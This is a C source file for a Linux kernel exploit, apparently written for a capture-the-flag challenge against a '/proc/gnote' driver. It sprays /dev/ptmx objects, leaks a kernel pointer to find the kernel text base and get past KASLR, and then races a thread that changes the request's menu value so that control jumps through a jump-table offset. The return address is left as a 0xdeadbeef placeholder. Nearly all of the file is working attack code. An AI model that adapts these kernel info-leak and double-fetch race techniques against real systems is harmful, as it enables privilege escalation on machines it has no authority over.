#include <pthread.h>
#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <sys/uio.h>
#include <sys/utsname.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <sys/mman.h>
#include <fcntl.h>
#define MENU_ADD    1 
#define MENU_SELECT 5
struct data race;
void DumpHex(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        } else {
            ascii[i % 16] = '.';
        }
        if ((i+1) % 8 == 0 || i+1 == size) {
            printf(" ");
            if ((i+1) % 16 == 0) {
                printf("|  %s \n", ascii);
            } else if (i+1 == size) {
                ascii[(i+1) % 16] = '\0';
                if ((i+1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i+1) % 16; j < 16; ++j) {
                    printf("   ");
                }
                printf("|  %s \n", ascii);
            }
        }
    }
}
struct data 
{
    unsigned int menu; 
    unsigned int arg;
};
int add_note(int fd, unsigned int size)
{
    struct data d;
    d.menu = MENU_ADD;
    d.arg = size;
    write(fd, (void *)&d, sizeof(struct data));
}
int select_note(int fd, unsigned int idx)
{
    struct data d;
    d.menu = MENU_SELECT;
    d.arg = idx;
    write(fd, (void *)&d, sizeof(struct data));
}

void racerace(void *s)
{
    struct data *data = s;
    while(1){
        data->menu = 623; // ((notes - jmp table)/8)+ 2
        printf("racerace\n");
    }
}

void writes(const char *buf) {
  while (*buf) {
    write(1, buf, 1);
    buf++;
  }
}
const char *hex = "0123456789abcdef";
void lhex(uint64_t num) {
  char buf[17];
  writes("0x");
  for (int i = 0; i < 16; i++) {
    buf[15-i] = hex[num & 0xf];
    num >>= 4;
  }
  buf[16] = 0;
  write(1, buf, sizeof(buf));
  writeln("");
}
const char nl = '\n';
void writeln(const char *buf) {
  writes(buf);
  write(1, &nl, 1);
}
#define LEAK_LEN 0x8000
int main(int argc, char *argv[])
{
    pthread_t pthread;
    int fd, fd2;
    int status;
    char buf[LEAK_LEN] = {0};
    struct data race;
    fd = open("/proc/gnote",O_RDWR);    
    if ( fd < 0 )
    {
        perror("open");
        exit(EXIT_FAILURE);
    }
#define ALLOC_NUM (50)
    int m_fd[ALLOC_NUM] = {0};
    for (int i = 0; i < ALLOC_NUM; i++)
        m_fd[i] = open("/dev/ptmx", O_RDWR|O_NOCTTY);
    for (int i = 0; i < ALLOC_NUM; i++)
        close(m_fd[i]);
    add_note(fd, 512);
    select_note(fd, 0);
    read(fd, buf, 512);
    DumpHex(buf, 512);
    void * leak = (*(void**)(buf+0x20));
    writes("[+] leak : "); lhex((long)leak);
    char * text_base = ((char*)leak) - 0x2b2fd0;    
    writes("[+] kernel text @ "); lhex((long)text_base);
    
    unsigned int rip = 0xdeadbeef;
    add_note(fd, rip);
    
    pthread_create(&pthread, NULL, racerace, &race);
    
   
    for (int i=0; i<0x4000000000; i++)
    {
        race.menu = MENU_ADD;
        race.arg = rip;
        write(fd, (void *)&race, sizeof(struct data));    
    }
    pthread_join(pthread, NULL);
    return 0;
}